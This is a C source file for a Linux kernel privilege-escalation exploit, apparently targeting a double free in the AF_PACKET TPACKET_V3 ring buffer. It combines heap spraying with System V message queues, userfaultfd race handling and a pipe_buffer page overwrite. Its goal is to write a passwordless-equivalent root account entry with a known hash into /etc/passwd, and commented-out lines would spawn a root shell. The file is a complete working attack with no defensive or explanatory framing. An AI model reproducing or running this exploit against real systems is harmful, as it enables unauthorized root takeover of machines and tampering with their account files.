#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <linux/if_packet.h>
#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/eventfd.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <poll.h>
#include <pthread.h>
#include <sys/xattr.h>
#include <linux/userfaultfd.h>
#include <asm/unistd.h>



#define CLOSE printf("\033[0m");
#define RED printf("\033[31m");
#define GREEN printf("\033[36m");
#define BLUE printf("\033[34m");
#define page_size 0x1000



void leak(size_t *content,size_t size)
{
    printf("[*]Leak: ");
    for(int i=0;i<(int)(size/8);i++)
    {
       printf("%llx\n",content[i]);
    }
}
void errExit(char * msg)
{
    printf("\033[31m\033[1m[x] Error : \033[0m%s\n",msg);
    exit(-1);
}

#define MSG_NUM 0X100
#define PIPE_NUM 0X100

int fpair[2];
int msg_qid[MSG_NUM+0x10];
int pipe_fd[PIPE_NUM][2];
size_t msg_buf[0x2000/8];
size_t leak_data[0x2000/8];
int victim_idx;
int ret = 0;
int data_id;
int target_file_fd;
char *page=NULL;
pthread_t monitor_thread;

static void setup_sandbox() {
    unshare(CLONE_NEWNET | CLONE_NEWUSER);
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    sched_setaffinity(getpid(), sizeof(set), &set);
}




void registerUserFaultFd(void * addr, unsigned long len, void (*handler)(void*))
{
    long uffd;
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    /* Create and enable userfaultfd object */
    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
        errExit("userfaultfd");

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
        errExit("ioctl-UFFDIO_API");

    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
        errExit("ioctl-UFFDIO_REGISTER");

    s = pthread_create(&monitor_thread, NULL, handler, (void *) uffd);
    if (s != 0)
        errExit("pthread_create");
}

static void *aa_free_thread(void *arg)
{
    struct uffd_msg msg;
    int fault_cnt = 0;
    long uffd;

    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) arg;

    for (;;) 
    {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        if (nready == -1)
            errExit("poll");

        nread = read(uffd, &msg, sizeof(msg));

        if (nread == 0)
            errExit("EOF on userfaultfd!\n");

        if (nread == -1)
            errExit("read");

        if (msg.event != UFFD_EVENT_PAGEFAULT)
            errExit("Unexpected event on userfaultfd\n");
        char tmp_buf[0x800];
        puts("[6] Now in userfaultfd thread and we will get a double free again.");
        //any addr free
        if(msgrcv(msg_qid[victim_idx], tmp_buf, 0x410 - 0x30, 0, IPC_NOWAIT | MSG_NOERROR)<0)
          errExit("[*]msgrcv!");
        

        if (fcntl(pipe_fd[4][1], F_SETPIPE_SZ, 0x1000 * 32) < 0) {
            printf("[x] failed to extend pipe 2!\n");
            return NULL;
        }
    
        for (int i = 0x4; i < 0x5; i++) {
              size_t magic_num = 0x22220000+i;
              write(pipe_fd[i][1], &magic_num, 8);
              write(pipe_fd[i][1], "Lotus777", 8);
              // write(pipe_fd[i][1], &magic_num, sizeof(int));
              write(pipe_fd[i][1], &magic_num, sizeof(int));
              write(pipe_fd[i][1], "Lotus777", 8);
              write(pipe_fd[i][1], "Lotus777", 8);  /* prevent pipe_release() */
          }

        //what you should do something there

        page = malloc(0x1000);
        memset(page,0,0x1000);
        uffdio_copy.src = (unsigned long) page;
        uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                              ~(page_size - 1);
        uffdio_copy.len = page_size;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
            errExit("ioctl-UFFDIO_COPY");

        return NULL;
    }
}

static void *evil_write_thread(void *arg)
{
    struct uffd_msg msg;
    int fault_cnt = 0;
    long uffd;

    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) arg;

    for (;;) 
    {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        if (nready == -1)
            errExit("poll");

        nread = read(uffd, &msg, sizeof(msg));

        if (nread == 0)
            errExit("EOF on userfaultfd!\n");

        if (nread == -1)
            errExit("read");

        if (msg.event != UFFD_EVENT_PAGEFAULT)
            errExit("Unexpected event on userfaultfd\n");
        char tmp_buf[0x200];
        puts("[7] Now in userfaultfd thread and we will edit the pipe_buffer->page to evil write into /etc/passwd.");

        for(int i=0;i<4;i++)
        {
            close(pipe_fd[i][0]);
            close(pipe_fd[i][1]);
        }

        char *data = ":$1$Lotus$TzwLEwMAk3C7fXk4o9atu0:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt Lotus Lotus
        printf("[9] Setting root password to \"Lotus\"...\n");
        int data_size = strlen(data);

        //what we want to edit pipe->page


            int retval = write(pipe_fd[4][1], data,data_size);
                if (retval < 0)
                {
                    printf("Pipe_write failed!");
                    return;
                }
                else if (retval < data_size)
                    {
                        printf("Short pipe write!");
                    return;
                    }



        GREEN puts("[*] Now the pwd is:"); CLOSE
        system("cat /etc/passwd");
        RED puts("[10] You should use su and enter the passwd `Lotus` yourself."); CLOSE
        // system("/bin/sh");
        read(fpair[1], 'A', 1);
        // system("echo 'Lotus' | su -c sh");
        // char *cmd[] = {"/bin/sh", "-c", "(echo Lotus; cat) | su - -c \""
        //             "echo \\\"Done! Popping shell... (run commands now)\\\";"
        //             "/bin/sh;"
        //         "\" root"};

        // execv("/bin/sh", cmd);
        
        // sleep(1000);
        page = malloc(0x1000);
        memset(page,0,0x1000);
        uffdio_copy.src = (unsigned long) page;
        uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                              ~(page_size - 1);
        uffdio_copy.len = page_size;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
            errExit("ioctl-UFFDIO_COPY");

        return NULL;
    }
}


struct list_head {
    size_t    next;
    size_t    prev;
};

struct msg_msg {
    struct list_head m_list;
    size_t    m_type;
    size_t    m_ts;
    size_t    next;
    size_t    security;
};

struct msg_msgseg {
    size_t    next;
};


// struct msgbuf {
//     long mtype;
//     char mtext[0];
// };


int getMsgQueue(void)
{
    return msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
}

int readMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz, msgtyp, 0);
}

/**
 * the msgp should be a pointer to the `struct msgbuf`,
 * and the data should be stored in msgbuf.mtext
 */
int writeMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    ((struct msgbuf*)msgp)->mtype = msgtyp;
    return msgsnd(msqid, msgp, msgsz, 0);
}

/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */
int peekMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz, msgtyp, 
                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);
}

void buildMsg(struct msg_msg *msg, size_t m_list_next, size_t m_list_prev, 
              size_t m_type, size_t m_ts,  size_t next, size_t security)
{
    msg->m_list.next = m_list_next;
    msg->m_list.prev = m_list_prev;
    msg->m_type = m_type;
    msg->m_ts = m_ts;
    msg->next = next;
    msg->security = security;
}

size_t find_page_addr(size_t *data)
{
          puts("[5] Search pwd->page...");
          for(int i=0;i<0xf00/8;i++)
          {
            if(data[i]>0xffff000000000000&&data[i+1]==0x100000000&&data[i+2]>0xffffffff81000000&&data[i+3]==0&&data[i+4]==0&&data[i]!=0xffffffffffffffff)
            {
              GREEN printf("[*] Found the addr of the pwd->page:0x%lx\n",data[i]); CLOSE
              return i;
            }
          }
          return 0;
}

char *uffd_buf_evil_write= NULL;
char *uffd_buf_free= NULL;

void exploit(void) 
{
    int fd;
    struct pipe_rw *pipes, *pipes2;

    setup_sandbox();
    target_file_fd = open("/etc/passwd",0);
    if(target_file_fd<0)
    {
        errExit("open pwd file error!");
    }

    uffd_buf_free = (char*) mmap(NULL, page_size * 2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    registerUserFaultFd(uffd_buf_free + page_size, page_size, aa_free_thread);

    uffd_buf_evil_write = (char*) mmap(NULL, page_size * 2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    registerUserFaultFd(uffd_buf_evil_write + page_size, page_size, evil_write_thread);

    for (int i = 0; i < MSG_NUM; i++)
    {
        msg_qid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
        if (msg_qid[i] < 0)
        {
            puts("[x] msgget!");
            return;
        }
    }

    for(int i=0;i<PIPE_NUM;i++)
    {
        if(pipe(pipe_fd[i])<0)
        {
            errExit("alloc pipe error!");
        }
    }

    // for (int i = MSG_NUM; i < MSG_NUM+0X10; i++)
    // {
    //     memset(msg_buf, 'D', 0X2000 - 8);
    //     msg_buf[0] = 0xeeee0000+i;

    //     ret = msgsnd(msg_qid[i], msg_buf, 0x410-0x30, 0);
    //     if (ret < 0)
    //     {
    //         puts("[x] msgsnd for msg_msg!");
    //         return;
    //     } 
    // }

    fd = socket(AF_PACKET, SOCK_RAW, 0);
    

    

    // Swicth to TPACKET_V3
    setsockopt(fd, SOL_PACKET, PACKET_VERSION, &(int){TPACKET_V3},sizeof(int));

    for(int i=0;i<2;i++)
    {
    if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, 0x1000 * 32) < 0) {
            printf("[x] failed to extend pipe %d!\n",i);
            return;
        }
    }

    // Allocate rx_owner_map - kmalloc-2048
    union tpacket_req_u treq = {};
    treq.req3.tp_block_size = 0x1000;
    treq.req3.tp_block_nr = 0x410 / 8;
    treq.req3.tp_frame_size = 0x1000;
    treq.req3.tp_frame_nr = 0x410 / 8;
    setsockopt(fd, SOL_PACKET, PACKET_RX_RING, &treq, sizeof(treq));

    puts("[1] Alloc some pipe_buffers at kmalloc-2k and init them.");

    for(int i=2;i<4;i++)
    {
    if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, 0x1000 * 32) < 0) {
            printf("[x] failed to extend pipe %d!\n",i);
            return;
        }
    }

    for (int i = 0; i < 0x4; i++) {
        size_t magic_num = 0x22220000+i;
        write(pipe_fd[i][1], &magic_num, 8);
        write(pipe_fd[i][1], "Lotus777", 8);
        // write(pipe_fd[i][1], &magic_num, sizeof(int));
        write(pipe_fd[i][1], &magic_num, sizeof(int));
        write(pipe_fd[i][1], "Lotus777", 8);
        write(pipe_fd[i][1], "Lotus777", 8);  /* prevent pipe_release() */
    }

    for (int i = 0; i < 4; i++) {
        size_t offset_in_file = 0;
        int ret = splice(target_file_fd, &offset_in_file, pipe_fd[i][1], NULL, 1, 0);
	    if (ret<0)
        {
            printf("splice failed:%d!",i);
            return;
        }
		    
	    else if (ret == 0)
        {
            printf("short splice:%d!",i);
            return;
        }    
    }

    puts("[2] First free the pg_vec at kmalloc-2k.");
    // 1st free the pg_vec
    memset(&treq, 0, sizeof(treq));

    setsockopt(fd, SOL_PACKET, PACKET_RX_RING, &treq, sizeof(treq));


    

    setsockopt(fd, SOL_PACKET, PACKET_VERSION, &(int){TPACKET_V2},sizeof(int));

    //2st free the pg_vec
    treq.req3.tp_block_size = 0x1000;
    treq.req3.tp_block_nr = 1;
    treq.req3.tp_frame_size = 0x1000;
    treq.req3.tp_frame_nr = 1;

    puts("[3] Second free the pg_vec at kmalloc-2k.");
    setsockopt(fd, SOL_PACKET, PACKET_RX_RING, &treq, sizeof(treq));

    // sleep(1);

    int i;
    printf("[4] spray 2k msg_msg and 2k msgseg to overlapping.\n");


    // for (int i = 0; i < MSG_NUM; i++)
    // {
    //     memset(msg_buf, 'D', 0X2000 - 8);
    //     msg_buf[0] = 0xeeee0000+i;

    //     ret = msgsnd(msg_qid[i], msg_buf, 0x410-0x30, 0);
    //     if (ret < 0)
    //     {
    //         puts("[x] msgsnd for msg_msg!");
    //         return;
    //     } 
    // }

    for (i = 0; i < MSG_NUM; i++)
    {
        memset(msg_buf, 'A', 0X2000 - 8);
        msg_buf[0] = 0xeeee0000+i;
        int idx=(0x1008-0x30)/8;
        

        

        ret = msgsnd(msg_qid[i], msg_buf, 0x410-0x30, 0);
        if (ret < 0)
        {
            puts("[x] msgsnd for msg_msg!");
            return;
        }
        memset(msg_buf, 'B', 0X2000 - 8);
        msg_buf[idx++] = 0xeeee0000+i;//list_node->prev
        msg_buf[idx++] = 0xdeadbeefdeadbeef;//mtype
        msg_buf[idx++] = 0xf00;//m_ts
        msg_buf[idx++] = 0;//next
        msg_buf[idx++] = 0;//security

        ret = msgsnd(msg_qid[i+1],msg_buf,0x1000+0x410-0x30-0x8,0);
        if (ret < 0)
        {
            puts("[x] msgsnd for msg_msgseg!");
            return;
        }
        

        ret = peekMsg(msg_qid[i],&leak_data,0x1f00,0);
        if(ret<0)
        {
          errExit("MSG_COPY error!");
        }
        else if(ret>144)
        {
        //   print_hex(leak_data,0xf00);
          data_id = find_page_addr(&leak_data);
          ret = msgrcv(msg_qid[i+1], msg_buf, 0x1000+0x410 - 0x30-0x8, 0, IPC_NOWAIT | MSG_NOERROR);
          if(ret<0)
          {
            errExit("[*]msgrcv!");
          }
          break;
        }
        else
        {
          ret = msgrcv(msg_qid[i+1], msg_buf, 0x1000+0x410 - 0x30-0x8, 0, IPC_NOWAIT | MSG_NOERROR);
          if(ret<0)
          {
            errExit("[*]msgrcv!");
          }
        }
        

        
    }
    if(!data_id)
    {
      errExit("Not found the addr of pwd->page.");
    }

    victim_idx = i;
    

    *(size_t *)(uffd_buf_free + page_size - 0x30) = leak_data[data_id]+0x1000;
        *(size_t *)(uffd_buf_free + page_size - 0x28) = leak_data[data_id]+0x1000;
        *(size_t *)(uffd_buf_free + page_size - 0x20) = 0xdeadbeefdeadbeef;
        *(size_t *)(uffd_buf_free + page_size - 0x18) = 0x800;
        *(size_t *)(uffd_buf_free + page_size - 0x10) = 0;
        *(size_t *)(uffd_buf_free + page_size - 0x8) = 0;

        setxattr("/exp", "Lotus", uffd_buf_free + page_size - 0x30, 0x410, 0);
  
        

       
        *(size_t *)(uffd_buf_evil_write + page_size - 0x28) = leak_data[data_id];
        *(size_t *)(uffd_buf_evil_write + page_size - 0x20) = 0x400000000;
        *(size_t *)(uffd_buf_evil_write + page_size - 0x18) = leak_data[data_id-3];
        *(size_t *)(uffd_buf_evil_write + page_size - 0x10) = 0x10;
        *(size_t *)(uffd_buf_evil_write + page_size - 0x8) = 0;

        setxattr("/exp", "Lotus", uffd_buf_evil_write + page_size - 0x28, 0x410, 0);

        memset(msg_buf, '\x00', 0X2000 - 8);
        msg_buf[0] = 0xdeadbeef;

        

        ret = msgsnd(msg_qid[MSG_NUM-1], msg_buf, 0x1000+0x410-0x30-0x8, 0);
        if (ret < 0)
        {
            puts("[x] msgsnd for msg_msg!");
            return;
        }


        return 0;

  

} 


int main(void) {
    int pid;
    char tmp;

    pipe(fpair);
    pid = fork();
    if (!pid) {
        exploit();
        exit(0);
    }


}
